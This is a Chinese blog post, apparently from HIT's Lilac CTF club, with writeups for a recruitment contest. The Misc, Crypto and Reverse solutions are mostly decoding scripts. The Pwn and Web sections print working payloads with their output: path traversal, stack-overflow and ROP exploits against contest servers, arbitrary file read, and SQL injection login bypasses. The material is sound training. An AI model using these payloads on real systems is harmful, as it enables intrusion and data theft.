@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Lilac五一欢乐赛writeup</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen%EF%B9%96v=792c672b3c.css" />
+
+    <meta name="description" content="Lilac战队在五一期间组织了一场招新欢乐赛，得到了校内、校外选手的热烈支持和广泛参与。这里是出题人们写的writeup！" />
+    <link rel="icon" href="../content/images/size/w256h256/2020/02/small-3.png" type="image/png" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="Pion1eer" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Lilac五一欢乐赛writeup" />
+    <meta property="og:description" content="Lilac战队在五一期间组织了一场招新欢乐赛，得到了校内、校外选手的热烈支持和广泛参与。这里是出题人们写的writeup！" />
+    <meta property="og:url" content="https://www.ruanx.net/51-writeup/" />
+    <meta property="og:image" content="https://www.ruanx.net/content/images/2022/01/--.jpg" />
+    <meta property="article:published_time" content="2020-05-06T02:57:14.000Z" />
+    <meta property="article:modified_time" content="2020-05-06T05:42:13.000Z" />
+    <meta property="article:tag" content="writeup" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Lilac五一欢乐赛writeup" />
+    <meta name="twitter:description" content="Lilac战队在五一期间组织了一场招新欢乐赛，得到了校内、校外选手的热烈支持和广泛参与。这里是出题人们写的writeup！" />
+    <meta name="twitter:url" content="https://www.ruanx.net/51-writeup/" />
+    <meta name="twitter:image" content="https://www.ruanx.net/content/images/2022/01/--.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Lilac" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="writeup" />
+    <meta property="og:image:width" content="2000" />
+    <meta property="og:image:height" content="1250" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Pion1eer",
+        "url": "https://www.ruanx.net/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://www.ruanx.net/content/images/size/w256h256/2020/02/small-3.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Lilac",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.ruanx.net/content/images/2020/05/lilac-square-1.png",
+            "width": 600,
+            "height": 600
+        },
+        "url": "https://www.ruanx.net/author/hitctf/",
+        "sameAs": []
+    },
+    "headline": "Lilac五一欢乐赛writeup",
+    "url": "https://www.ruanx.net/51-writeup/",
+    "datePublished": "2020-05-06T02:57:14.000Z",
+    "dateModified": "2020-05-06T05:42:13.000Z",
+    "keywords": "writeup",
+    "description": "Lilac战队在五一期间组织了一场招新欢乐赛，得到了校内、校外选手的热烈支持和广泛参与。这里是出题人们写的writeup！",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://www.ruanx.net/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.8" />
+    <link rel="alternate" type="application/rss+xml" title="Pion1eer" href="../rss/index.rss" />
+    <script defer src="https://cdn.jsdelivr.net/npm/@tryghost/portal@~2.5/umd/portal.min.js" data-ghost="https://www.ruanx.net/" data-key="595acd8f13c14d79a10527399d" data-api="https://www.ruanx.net/ghost/api/content/" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/npm/@tryghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="595acd8f13c14d79a10527399d" data-styles="https://cdn.jsdelivr.net/npm/@tryghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://www.ruanx.net/" crossorigin="anonymous"></script>
+    <script defer src="../public/cards.min%EF%B9%96v=792c672b3c.js"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min%EF%B9%96v=792c672b3c.css">
+    <!-- link href="https://fonts.googleapis.com/css?family=Noto+Serif+SC&display=swap" rel="stylesheet" -->
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Noto+Serif+SC&amp;display=swap" rel="stylesheet">
+
+<style>.post-content,.post-card-excerpt{font-family: 'Noto Serif SC', "PingFang SC","Helvetica Neue",Helvetica,"Hiragino Sans GB","Microsoft YaHei","微软雅黑",Arial,sans-serif;}
+    .post-full-content{font-size: 100%;}
+    .post-full-custom-excerpt {font-size: 1.8rem;}
+    .post-full-title {font-size:3.2rem;}
+    .post-full-content blockquote{margin:20px;padding: 1em;  background-color: #3eb0ef14; }
+    .post-full-content blockquote p {font-style:normal;}
+    .post-full-image {display:none;}
+    
+    /* .post-full-content figcaption {margin: .4em 0 .5em  !important} */
+    
+    .kg-callout-card {width: 100%; margin-bottom: 1em;}
+    
+    .post-full-content figure {margin: 0.8em 0 1em;}
+    
+    p {margin: 0.2em 0 0.5em !important;}
+    
+    .post-full-content img{border-radius:5px;}
+    
+    code {font-family: 'Noto Serif SC';}
+</style>
+
+
+<style>:root {--ghost-accent-color: #15171A;}</style>
+
+</head>
+<body class="post-template tag-writeup">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="../index.html">Pion1eer</a>
+            <div class="site-nav-content">
+                    <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-about"><a href="../about/index.html">About</a></li>
+</ul>
+
+                    <span class="nav-post-title dash">Lilac五一欢乐赛writeup</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://www.ruanx.net/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div>
+
+<script>
+ MathJax = {
+        tex:{
+                inlineMath: [['$', '$'], ['\\(', '\\)']]
+            },
+        svg:{
+                fontCache: 'global'
+            }
+        }; 
+    </script>
+    <script src="https://cdn.staticfile.org/babel-polyfill/7.12.1/polyfill.min.js?features=es6"></script>
+    <script type="text/javascript" id="MathJax-script" async  src="https://cdn.staticfile.org/mathjax/3.2.2/es5/tex-mml-chtml.js"></script>
+
+<style>@media (prefers-color-scheme: light) {
+		.post-full-content  
+    pre{background:#fafafa;margin:10px 10px 20px 10px;border-style: solid;border-color:#DCDFE6;}
+}
+</style>
+
+<link rel="stylesheet" href="https://cdn.ruanx.net/css/atom-one-dark.css">
+<link rel="stylesheet" media="(prefers-color-scheme: light)" href="https://cdn.ruanx.net/css/atom-one-light.min.css">
+<style>.post-full-content  code{font-family: 'Fira Mono', 'Jetbrains mono', 'ubuntu mono', consolas, 'monospace' !important;}
+</style>
+
+</header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-writeup no-image no-image">
+
+            <header class="post-full-header">
+
+                <section class="post-full-tags">
+                    <a href="../tag/writeup/index.html">writeup</a>
+                </section>
+
+                <h1 class="post-full-title">Lilac五一欢乐赛writeup</h1>
+
+                <p class="post-full-custom-excerpt">Lilac战队在五一期间组织了一场招新欢乐赛，得到了校内、校外选手的热烈支持和广泛参与。这里是出题人们写的writeup！</p>
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/05/lilac-square-1.png" alt="Lilac" />
+                                    <div class="author-info">
+                                        <div class="bio">
+                                            <h2>Lilac</h2>
+                                            <p>哈尔滨工业大学紫丁香CTF俱乐部！</p>
+                                            <p><a href="../author/hitctf/index.html">More posts</a> by Lilac.</p>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <a href="../author/hitctf/index.html" class="author-avatar">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/05/lilac-square-1.png" alt="Lilac" />
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="../author/hitctf/index.html">Lilac</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-05-06">6 May 2020</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 15 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>　　感谢一百多位选手捧场。以下是出题人写的 writeup.</p><h2 id="misc">Misc</h2><p>《Yankee with no brim》出题人是 Merrg1n，《大司马与千层饼》出题人是 Init_new_world，其余题目出题人是阮行止。</p><!--kg-card-begin: markdown--><h3 id="">打工是不可能打工的</h3>
+<p>StegSolve 逐帧浏览，flag藏在最后一帧。</p>
+<h3 id="zip0">zip-0</h3>
+<p>爆破即可。Windows下可以使用ARCHPR，Linux下可以使用yazc，据说很快。</p>
+<h3 id="zip1">zip-1</h3>
+<p>伪加密。可以用十六进制编辑器手动改，也可以用工具 <code>ZipCenOp.jar</code></p>
+<p>据说 7zip 可以忽略伪加密直接看 flag。</p>
+<p><strong>zsh</strong>的民间题解：<br>
+直接二进制打开也可以</p>
+<pre><code>2I)...).......fl
+ag.txtflag{fakE_
+encrypti0n_is_so
+_easy_to_so1ve}P
+K..?........(.P.
+</code></pre>
+<h3 id="">樱花</h3>
+<p>信息以字符串的形式直接嵌入到文件中。</p>
+<pre><code class="language-bash">➜  strings sakura.jpg | grep flag
+flag{y0u_have_find_this_STRING_in_photo}
+</code></pre>
+<h3 id="">隐写</h3>
+<p>不难看出 red plane 0 有东西：</p>
+<!--kg-card-end: markdown--><figure class="kg-card kg-image-card"><img src="../content/images/2020/05/image-27.png" class="kg-image" alt loading="lazy"></figure><p>提取出来就是flag.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/05/image-29.png" class="kg-image" alt loading="lazy"></figure><!--kg-card-begin: markdown--><h3 id="">真正的互联网</h3>
+<p>访问它就行了。</p>
+<p>如果您没法访问它，那您显然得想办法访问它。</p>
+<h3 id="zip2">zip-2</h3>
+<p>明文攻击。使用工具ARCHPR.</p>
+<h3 id="yankeewithnobrim">Yankee with no brim</h3>
+<p>jpg后面藏了个PNG 用010 editor或者binwalk都能提取出来.</p>
+<p>然后PNG的ihdr chunk的CRC错误，写个脚本爆破一下得到正确高度</p>
+<h3 id="">大司马与千层饼</h3>
+<p><strong>出题人</strong>的题解：</p>
+<p>ResourceHacker可得到一个凯撒加密网址，打开后一个二维码补上定位点直接扫即可得到flag.</p>
+<p>出题人补几个图：<br>
+第一步：使用ResourceHacker,可以看到CAE3!ENCODE的提示，表示是凯撒(caesar)3位<br>
+<img src="../content/images/2020/05/Step1.jpg" alt="Step1" loading="lazy"></p>
+<p>第二步：百度凯撒密码解密，得到网址<br>
+<img src="../content/images/2020/05/Step2.png" alt="Step2" loading="lazy"></p>
+<p>第三步：补好码点，直接扫，得到flag<br>
+<img src="../content/images/2020/05/Step3.png" alt="Step3" loading="lazy"></p>
+<p>注：题面说了“你可能在第五层，而我在第一层”表示flag其实不可能层层嵌套，而是浮在表面的，一步就没了；</p>
+<p>“第五层”部分民间题解已经解释了，就不详细说了；那个“微小的颜色变化”是我使用了低颜色数(8位)转存了一张高颜色数(24位)的图片产生的，三张图的颜色数不是完全一样；</p>
+<p>彩蛋：这个程序是我以前对UOJ207的一个实现，同时做了一点轻微的混淆，你可以用UOJ207的数据跑一下，应该能获得正确的结果。</p>
+<p>出题想法来自近期某场CTF比赛的一道Misc签到题，并不是我原创。三天的比赛直到最后我也没做出那道题。</p>
+<p><strong>Ciel</strong>的民间题解：</p>
+<p>strings 发现 <code>You see the string,but it is not so easy...but it's baby!</code> ，binwalk 发现有⼀个<br>
+7z 包，拆出来解压得到⼀个 GIF 。对 GIF strings 发现⼀个 <code>Fak3{Se3_3x1f_bu7_1t5_n0t_f1ag}</code> 。拆帧发现只有前三帧和其他的不同，其二是没有 3 个码点的二维码，补全并扫描得到<code>Fak3{G1FSPL1t_1s_fuun_bU7_n0t_th1s+prob}</code> 和 <code>Fak3{B1nwa1k_1s_fuun_bU7_n0t_th1s+prob}</code> 。进⼀步观察发现 frame 3 的图形上有微小的颜色变化，尝试直接 LSB 失败。将图片读入处理得到非白色的颜色只有 8 种，然而没有什么进⼀步的思路了。<br>
+赛后得知，直接对原 exe 文件 Resource Hacker 即可找到⼀个恺撒移位的网址，打开之后是二维码，补上 3 个码点直接扫就完事了。</p>
+<!--kg-card-end: markdown--><hr><h2 id="crypto">Crypto</h2><p>出题人阮行止。 </p><!--kg-card-begin: markdown--><h3 id="base64">不神必的 base64</h3>
+<p>base64 解码即可。</p>
+<h3 id="">神秘代码</h3>
+<p>可以自己写，也可以用 <code>libnum</code> 或 <code>Crypto</code> 现成的函数。</p>
+<pre><code class="language-python">import libnum
+libnum.n2s(10786438895798227883161514210116248549506979726714263760481486728317)
+</code></pre>
+<h3 id="railfence">rail fence</h3>
+<p>用 CyberChef 瞎试试就出来了。</p>
+<h3 id="">王 室 复 辟</h3>
+<p>爆破 Caesar 即可。<br>
+如果懒得写脚本，就用 CyberChef 的 ROT13，也可以用来爆破Caesar。</p>
+<h3 id="">点横点横横</h3>
+<p>用 CyberChef，from Morse Code.</p>
+<h3 id="">单表替换</h3>
+<p>用 <code>quipqiup.com</code><br>
+当然了，您也可以猜出这是葛底斯堡演说。</p>
+<h3 id="chcooh">CH₃COOH</h3>
+<p>Vigenere 密码。随便找个在线工具爆破。<br>
+e.g. <a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<h3 id="">三天之内</h3>
+<p>爆破时间。</p>
+<pre><code class="language-python">from Crypto.Cipher import AES
+import time, itertools, base64
+from hashlib import md5
+
+def decode(ts, s):
+    key = md5(str(ts).encode()).digest()
+    
+    aes = AES.new(key, AES.MODE_ECB)
+    outData = aes.decrypt(base64.b64decode(s))
+
+    print(time.asctime(time.gmtime(ts)))
+    if b'flag' in outData:
+        print(outData)
+        return True
+    return False
+
+
+def brute(beg, enc):
+    for ts in itertools.count(beg):
+        if decode(ts, enc):
+            return
+
+brute(1587880000, 'THM3FOB7PxOgVoI1fGsqQDJLGu41mL9nKCNeMvXzB+l8MFirir0C19YRS/ruDILq')
+
+</code></pre>
+<h3 id="base64">神必 base64</h3>
+<p>带密码表的base64，相当于在常规base64之后做了一次单表替换。</p>
+<p>推出替换表就行了。</p>
+<pre><code class="language-python">import base64
+
+msg = base64.b64encode(open('plain.txt', 'rb').read())
+msg = msg.decode()[:-10]
+
+cipher = open('cipher.txt').read()
+
+dic = {}
+
+for a, b in zip(msg, cipher[:len(msg)]):
+    print(f'{a} -&gt; {b}')
+    dic[b] = a
+
+res = ''.join([dic[x] if x in dic else x for x in cipher])
+res = base64.b64decode(res.encode()).decode()
+print(res)
+</code></pre>
+<h3 id="rsa0">RSA-0</h3>
+<p>直接解码。</p>
+<h3 id="rsa1">RSA-1</h3>
+<p>注意到欧拉函数是积性函数，于是 $\varphi(n)$ 可求。</p>
+<!--kg-card-end: markdown--><hr><h2 id="reverse-function reverse() { [native code] }1">Reverse</h2><p>出题人 xhy.</p><!--kg-card-begin: markdown--><h3 id="basicre1">basicre1</h3>
+<p>异或加密，密钥是i ^ 0x55</p>
+<pre><code class="language-python">ct = [33,  60, 102, 37, 14,  97,  32, 13, 41,  52,
+  108, 1,  59,  57, 40,  107, 38, 27, 119, 32,
+  30,  50, 112, 52, 126, 62,  60, 125]
+print(&quot;flag{{{}}}&quot;.format(''.join(map(lambda i: chr(ct[i] ^ 0x55 ^ i), range(len(ct))))))
+</code></pre>
+<p><code>flag{th1s_1s_th3_bas1c_0f_r3v3rs3}</code></p>
+<h3 id="basicre2">basicre2</h3>
+<p>考察大小端法转化，可以用python的<code>struct</code>模块</p>
+<pre><code class="language-python">import struct
+target = [1211396208,2034593380,1765043792,878930775,
+          1769236560,2037672047,1851749236,1920295796]
+print(&quot;flag{{{}}}&quot;.format(
+  b''.join(map(lambda n: struct.pack(&quot;&gt;I&quot;, n), target)).decode('ascii')))
+</code></pre>
+<p><code>flag{H4ppyEndi4nP4ckWithPython_struct}</code></p>
+<h3 id="basicre3">basicre3</h3>
+<p>XTEA算法ECB模式。建议学习TEA，XTEA和XXTEA算法，熟练识别这几种分组加密算法的形式。</p>
+<pre><code class="language-c">/**
+ * Get correct input to make program print Congratulations!
+ */
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+
+void xtea_decrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
+    unsigned int i;
+    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
+    for (i=0; i &lt; num_rounds; i++) {
+        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);
+        sum -= delta;
+        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);
+    }
+    v[0]=v0; v[1]=v1;
+}
+
+int GetPassword(void) {
+  const uint32_t key[] = {1634494796, 1818840163, 1766613857, 6513004};
+
+  uint8_t target[] = {0x6f, 0x7d, 0xcf, 0x96, 0x9d, 0x31, 0x1f, 0x9b,
+                      0xa0, 0x82, 0x9e, 0x2a, 0x73, 0xe6, 0xde, 0xb3,
+                      0xab, 0x99, 0xbb, 0x88, 0x29, 0xa6, 0xa3, 0xcd};
+
+  for (int i = 0; i &lt; sizeof(target); i += 8) {
+    xtea_decrypt(32, &amp;target[i], key);
+  }
+
+  printf(&quot;flag{%s}\n&quot;, target);
+}
+
+int main(void) {
+  GetPassword();
+  return 0;
+}
+</code></pre>
+<p><code>flag{hAve_fuN_ovo_WIth_XTEA}</code></p>
+<h3 id="babyre">babyre</h3>
+<p>考察RC4算法，这题在.init段挖了一个坑，.init段有一段对目标数组的异或解密代码。如下：</p>
+<pre><code class="language-C">void init(void) __attribute__((constructor));
+void init(void) {
+  for (int i = 0; i &lt; sizeof(target); i++) {
+    target[i] ^= 0x37;
+  }
+}
+</code></pre>
+<p>下面是解密代码</p>
+<pre><code class="language-C">#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+
+void ksa(unsigned char *state, unsigned char *key, int keylen) {
+   int i, j = 0, t;
+   for (i = 0; i &lt; 256; ++i)
+      state[i] = i;
+   for (i = 0; i &lt; 256; ++i) {
+      j = (j + state[i] + key[i % keylen]) % 256;
+      t = state[i];
+      state[i] = state[j];
+      state[j] = t;
+   }
+}
+
+void rc4(unsigned char *state, unsigned char *data, int len) {
+   int i = 0, j = 0, x, t;
+   for (x = 0; x &lt; len; ++x)  {
+      i = (i + 1) % 256;
+      j = (j + state[i]) % 256;
+      t = state[i];
+      state[i] = state[j];
+      state[j] = t;
+      data[x] ^= state[(state[i] + state[j]) % 256];
+   }
+}
+
+int main(void) {
+//   char *input = GetInput();
+  unsigned char target[] =&quot;o\\Pp\xd7QS\xbdW\x9d\xa7\xa7$\xb1\x91L\xd3Lvu\x02\xbb(U\x84&quot;;
+  for (int i = 0; i &lt; strlen(target); ++i) {
+      target[i] ^= 0x37;
+  }
+  unsigned char sbox[256];
+  ksa(sbox, &quot;\\(*OvO*)/&quot;, 9);
+  rc4(sbox, target, strlen(target));
+  printf(&quot;flag{%s}\n&quot;, target);
+}
+</code></pre>
+<p><code>flag{RC4_kn0ck_Knock_w1tH_1n1t}</code></p>
+<h3 id="hundred">hundred</h3>
+<p>百元一次方程组。函数太大不能反编译，可以通过修改<code>$IDA_HOME/cfg/hexrays.cfg</code>这个配置文件将MAX_FUNCSIZE=64 改大来解决。也可以尝试从汇编代码中解析出方程组进行求解，还可以通过angr进行求解。</p>
+<p>这里使用SMT求解器z3求解方程组。<br>
+源码：<a href="https://file.hitctf.cn/51happy/solve.py">https://file.hitctf.cn/51happy/solve.py</a></p>
+<!--kg-card-end: markdown--><hr><h2 id="pwn">Pwn</h2><p>　　除《石头剪刀布》之外出题人为 wxk，《石头剪刀布》出题人为阮行止。</p><!--kg-card-begin: markdown--><h3 id="1">1. 坤坤の地址</h3>
+<p>在linux下直接执行 nc 命令拿到 flag</p>
+<pre><code>➜  games nc 47.94.239.235 4001
+welcome to Lilac@HIT
+Here is kunkun's address:
+flag{zonghelou_714}
+</code></pre>
+<h3 id="2">2. 坤坤の唱</h3>
+<p>首先通过 hint 可知服务器上目录结构如下</p>
+<pre><code>.
+├── dir
+│   ├── jay
+│   │   └── qilixiang
+│   └── pwn // 可执行文件
+└── flag
+</code></pre>
+<p>通过分析题目文件可以得知需要输入两个字符串, 两者拼接得到路径. 程序会打开该路径的文件并打印文件的内容. 但是两个字符串中不能包含 &quot;../&quot;</p>
+<p>我们可以通过分别输入 &quot;..&quot; 和 &quot;/flag&quot; 实现拿到flag</p>
+<pre><code>➜  games nc 47.94.239.235 4002
+input the singer's name:
+..
+input the song's name:
+/flag
+here is the lyric:
+flag{w0w_you_successfully_escape_the_r3strict}
+</code></pre>
+<h3 id="3">3. 坤坤の篮球</h3>
+<p>这题出题失误了. 导致很容易随便输点东西就拿到flag...本来想考的是整型溢出.</p>
+<p>乍一看题目的逻辑就是猜对100次随机数就拿到flag. 随机数还会把端续打乱之后打印出来.<br>
+但是问题在于每猜一次程序都会sleep 1秒, 而程序执行 60秒后会被终止. 所以这种方法拿不到flag.</p>
+<p>但是通过故意猜错可以使得分数减为负数, 而比较的时候是和无符号数比较的. 所以存在整形溢出漏洞. 拿到flag. 结果不少人随便试试就把flag试出来了... 我的锅...</p>
+<p><strong>zsh</strong>的民间题解：<br>
+我好像就是直接根据那个 hint 运算的。。代码是</p>
+<pre><code class="language-py">from pwn import *
+import os
+conn = remote('47.94.239.235',4003)
+while(1):
+    l = &quot;&quot;
+    # l = conn.recvline_contains(&quot;some hint : &quot;)
+    while(1):
+        l = conn.recvline().decode(&quot;utf-8&quot;)
+        print(l)
+        if l.find(&quot;some hint : &quot;) != -1:
+            break 
+    # print(l)
+    x = int(l.split(&quot; : &quot;)[1])
+    print(&quot;%x&quot; % x)
+    os.system(&quot;echo &quot; + str(x) + &quot;| ./a.out &gt; output&quot;)
+    f = open(&quot;output&quot;, &quot;r&quot;)
+    t = f.read()
+    f.close()
+    conn.sendline(t)
+# hint : RAND_MAX is 2147483647
+# give you some hint : -1897606077
+# guess the target:
+</code></pre>
+<p>等一会能出来flag...</p>
+<h3 id="4rap">4. 坤坤のrap</h3>
+<p>使用IDA 可以看到连续声明了 256 字节的 buﬀer 然后是⼀个 int 。存在栈溢出漏洞. 随便输⼊点啥，⽐ 256 字节⻓⼀点，把 int 覆盖成非零的值就可以拿到flag了</p>
+<pre><code>➜  games python -c &quot;print('a'*280)&quot; | nc 47.94.239.235 4004
+请开始你的表演:
+ncongrats, here is the flag
+flag{stack_0verflow_is_annoying!!}
+tql!!!
+请开始你的表演:
+你就是逊啦
+</code></pre>
+<h3 id="5">5. 坤坤の舞</h3>
+<p>同样存在栈溢出漏洞. 不过这次需要自己覆盖返回地址. 注意到有一个 <code>get_flag</code> 函数. 将返回地址覆盖到这个 函数就可以拿到 flag 了</p>
+<p>首先拿到 <code>get_flag</code> 函数的地址</p>
+<pre><code>➜  5_dance readelf -s ./pwn | grep get_flag
+    57: 0000000000400728   111 FUNC    GLOBAL DEFAULT   14 get_flag
+</code></pre>
+<p>然后用地址作为填充, 覆盖返回地址</p>
+<pre><code>➜  5_dance python -c &quot;print('\x28\x07\x40\x00\x00\x00\x00\x00'*40)&quot; | nc 47.94.239.235 4005
+请开始你的表演:
+ncongrats, here is the flag
+flag{It_1s_amazing_to_overwrite_return_address}
+tql!!!
+</code></pre>
+<h3 id="6">6. 坤坤の绝地反击</h3>
+<p>和上一题一样, 本题同样存栈溢出漏洞和 get_flag 函数. 但是本题的get_flag 函数需要传入参数了.</p>
+<pre><code class="language-c">void get_flag(char *path){
+    if (!validate(path))
+        die(&quot;invalid path&quot;);
+    // puts(&quot;ncongrats, here is the flag&quot;);
+    int fd = open(path, 0);
+    char buf[0x100];
+    int len = read(fd, buf, 0x100);
+    write(1, buf, len);
+    puts(&quot;\nbye bye&quot;);
+    exit(0);
+}
+</code></pre>
+<p>所以我们在通过返回地址跳到 <code>get_flag</code> 函数之前需要先设置好参数.<br>
+amd64 linux下第一个参数是通过 <code>rdi</code> 寄存器传递的.</p>
+<p>通过 ida 分析可以发现程序中存在 &quot;./flag&quot; 字符串</p>
+<pre><code>.rodata:000000000040093E aFlag           db './flag',0    
+</code></pre>
+<p>因此我们要做的就是把 <code>rdi</code> 寄存器的值设置为 <code>0x000000000040093E</code>. 这儿就要用到 <code>ROP</code> 技术了. 具体原理网上很多博客了. 这儿不再赘述.</p>
+<p>首先用 <code>ropper</code> 找到 <code>gadget</code></p>
+<pre><code>➜  6_final ropper -f ./pwn --search &quot;pop rdi; ret&quot;
+[INFO] Load gadgets for section: PHDR
+[LOAD] loading... 100%
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi; ret
+
+[INFO] File: ./pwn
+0x0000000000400903: pop rdi; ret;
+</code></pre>
+<p>然后构造 <code>payload</code></p>
+<pre><code>➜  6_final python -c &quot;from struct import pack;print('a'*0x118+pack('&lt;Q', 0x400903)+pack('&lt;Q', 0x40093E)+pack('&lt;Q', 0x400798))&quot; | nc 47.94.239.235 4006
+请开始你的表演:
+flag{ROP_is_really_rea11y_useful!!}
+bye bye
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="-">石头剪刀布</h3><p>注意到采用的种子只可能是 0,1,2,...9，那我们猜是 0. 本地运行程序，以 0 为种子生成 100 个数，然后赢这100次。</p><p>接下来开始不停地找服务器玩游戏，就出我们刚刚决策好的序列。十几秒之后你就拿到 flag 了。</p><p>[TODO] : exp</p><hr><h2 id="web">Web</h2><p>《F12》和《i18n》出题人为阮行止，其余为惊蛰。</p><!--kg-card-begin: markdown--><h3 id="f12">F12</h3>
+<p>按下F12，切到 Network 窗口，刷新页面，从请求头得知 flag.</p>
+<h3 id="i18n">i18n</h3>
+<p>一个很明显的任意文件读。<br>
+payload：<code>?lang=qwqQAQwww&amp;language_file=/flag</code></p>
+<h3 id="ezsql">ezsql</h3>
+<p>最基础的sql注入，并且给了sql语句。注入点是用户名，在用户名后面用注释符号截断即可。</p>
+<p>当然，你要是使用<code>and</code>和<code>or</code>的话，你会发现他们被过滤了。</p>
+<p>payload：</p>
+<pre><code>admin' #
+admin' -- 
+</code></pre>
+<p><strong>zsh</strong> 的民间题解：</p>
+<pre><code>xxx' || true -- 
+</code></pre>
+<h3 id="ezsqlagain">ezsql again</h3>
+<p>这个题主要考的是一个设计缺陷的问题。</p>
+<p>注释里告诉你有源码的备份文件。</p>
+<p>sql查询操作使用了预编译，这里是没有办法进行注入的。</p>
+<p>审计源码，你会发现从<code>$_POST</code>中获取的参数，没有考虑过键值是否存在的问题，如果不存在，得到的结果会是<code>NULL</code>。所以你只需要随便输入一个数据库中不存在的用户名，使查询结果为<code>NULL</code>，同时，登陆请求中不传入<code>password</code>，即可通过验证。</p>
+<p>此外，预编译或者说参数化查询，真的可以防御所有的SQL注入么？</p>
+<h3 id="whereisflag">where is flag？</h3>
+<p>审计源码，你会发现flag一开始就被删了，那么在哪还能找到他呢？<s>（回收站）</s></p>
